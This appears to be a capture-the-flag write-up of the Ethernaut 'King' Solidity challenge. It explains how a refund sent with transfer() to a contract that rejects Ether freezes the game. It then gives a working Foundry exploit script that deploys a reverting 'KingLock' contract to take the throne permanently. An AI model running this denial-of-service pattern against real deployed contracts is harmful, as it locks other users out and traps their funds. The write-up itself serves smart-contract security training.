---
layout: writeup
title: "King"
level: "Intermediate"
category: "Ethernaut"
description: "Claim the throne and remain King forever by creating a contract that refuses to accept Ether."
---

## Analysis

The `King` contract works like a game: to become the new king, you must send more Ether than the current "prize." When someone does this, the contract sends the previous prize back to the old king:
`payable(king).transfer(msg.value);`

**The Flaw:**
The contract uses `transfer()` to send funds to the previous king. In Solidity, `transfer()` has a fixed gas limit and **throws an error** if the recipient's code execution fails or if the recipient is a contract that cannot receive Ether.



If the current King is a contract that **does not have a receive() or fallback() function**, the `transfer()` call will always fail and revert. This prevents anyone else from ever becoming the new King, as the transaction will always roll back.

---

## Solution

You must deploy an "Indestructible King" contract that becomes the king but lacks any logic to accept incoming Ether.

---

**Exploit Script (Foundry):**

<pre class="plain-code"><code>
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

import "forge-std/Script.sol";

contract KingLock {
    constructor(address payable _king) payable {
        (bool ok, ) = _king.call{value: msg.value}("");
        require(ok, "become king failed");
    }
    receive() external payable {
        revert("I will not accept payment");
    }
}

contract ExploitKingInstance is Script {
    function run() external {
        address instance = vm.envAddress("INSTANCE_ADDR");
        uint256 pk = vm.envUint("PRIVATE_KEY");
        vm.startBroadcast(pk);

        // Deploy KingLock and send 0.002 ether to become king on the instance
        new KingLock{value: 0.002 ether}(payable(instance));

        vm.stopBroadcast();
    }
}

</code></pre>

---